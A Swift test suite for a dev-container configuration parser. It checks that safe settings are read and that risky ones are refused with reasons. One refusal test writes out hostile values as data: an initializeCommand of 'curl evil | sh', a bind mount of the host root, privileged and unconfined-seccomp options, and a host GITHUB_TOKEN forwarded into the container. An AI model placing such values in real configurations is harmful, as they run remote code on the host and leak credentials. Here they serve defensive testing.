import Foundation
import Testing

@testable import ContainerKit

/// Dev containers: the safe subset is read; host commands, Features and privileges are refused with a reason.
@Suite("Dev containers")
struct DevContainerTests {
    let project = "/Users/me/Repos/app"

    func plan(_ text: String) -> DevContainerPlan {
        DevContainerPlan.parse(Data(text.utf8), file: project + "/.devcontainer/devcontainer.json", projectRoot: project)
    }

    @Test func imageEnvUserPortsAndLifecycleWithComments() {
        let result = plan("""
        // A typical file
        {
          "name": "app",
          "image": "mcr.microsoft.com/devcontainers/typescript-node:22", /* block comment */
          "workspaceFolder": "${localWorkspaceFolder}",
          "containerEnv": { "NODE_ENV": "development" },
          "remoteEnv": { "PATH_EXTRA": "/x" },
          "remoteUser": "node",
          "forwardPorts": [3000, 5173],
          "postCreateCommand": "npm ci",
          "postStartCommand": ["npm", "run", "dev's"],
          "customizations": { "vscode": { "extensions": ["dbaeumer.vscode-eslint"] } },
        }
        """)
        #expect(result.refused.isEmpty, "\(result.refused)")
        #expect(result.isUsable)
        #expect(result.image == "mcr.microsoft.com/devcontainers/typescript-node:22")
        #expect(result.containerEnv == ["NODE_ENV": "development"])
        #expect(result.remoteUser == "node")
        #expect(result.forwardPorts == [3000, 5173])
        #expect(result.postCreate == "npm ci")
        #expect(result.postStart == "'npm' 'run' 'dev'\\''s'")
        #expect(result.ignored == ["customizations", "name"])
        #expect(result.lifecycleDigest != nil)
    }

    @Test func buildIsResolvedInsideTheProject() {
        let result = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "..", "args": {"VARIANT": "22"}, "target": "dev"}}"#)
        #expect(result.isUsable)
        #expect(result.build?.dockerfile == project + "/.devcontainer/Dockerfile")
        #expect(result.build?.context == project)
        let argv = result.buildArguments(tag: "bellocode-dev-k:1") ?? []
        #expect(argv.starts(with: ["buildx", "build", "--load"]))
        #expect(argv.contains("VARIANT=22") && argv.last == project)
        let outside = plan(#"{"build": {"dockerfile": "Dockerfile", "context": "../../.."}}"#)
        #expect(outside.refused.map(\.key) == ["build.context"])
    }

    @Test func hostCommandsFeaturesAndPrivilegesAreRefusedWithReasons() {
        let result = plan("""
        {
          "image": "x", "initializeCommand": "curl evil | sh", "features": { "ghcr.io/devcontainers/features/node:1": {} },
          "privileged": true, "capAdd": ["SYS_PTRACE"], "runArgs": ["--network=host"], "mounts": ["source=/,target=/host,type=bind"],
          "securityOpt": ["seccomp=unconfined"], "workspaceFolder": "/workspace", "postAttachCommand": "x",
          "postCreateCommand": { "a": "x", "b": "y" }, "containerEnv": { "TOKEN": "${localEnv:GITHUB_TOKEN}" }
        }
        """)
        let keys = Set(result.refused.map(\.key))
        for key in ["initializeCommand", "features", "privileged", "capAdd", "runArgs", "mounts", "securityOpt", "workspaceFolder",
                    "postAttachCommand", "postCreateCommand", "containerEnv.TOKEN"] {
            #expect(keys.contains(key), "\(key) not refused")
        }
        #expect(!result.isUsable)
        #expect(result.refused.first { $0.key == "initializeCommand" }?.reason.contains("on this Mac") == true)
        // Empty or false values ask for nothing.
        #expect(plan(#"{"image": "x", "features": {}, "privileged": false, "runArgs": []}"#).refused.isEmpty)
    }

    @Test func invalidOrIncompleteFilesSaySo() {
        #expect(plan("{ not json").refused.first?.key == "(file)")
        #expect(plan(#"{"name": "x"}"#).refused.first?.key == "image")
        #expect(plan(#"{"dockerComposeFile": "compose.yaml", "service": "app"}"#).refused.contains { $0.key == "dockerComposeFile" })
    }

    @Test func commentsInsideStringsAreKept() {
        let data = DevContainerPlan.stripJSONC(Data(#"{"a": "http://x/*y*/", "b": [1,2,], // c"#.utf8) + Data("\n}".utf8))
        let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
        #expect(json?["a"] as? String == "http://x/*y*/")
        #expect((json?["b"] as? [Int]) == [1, 2])
    }
}
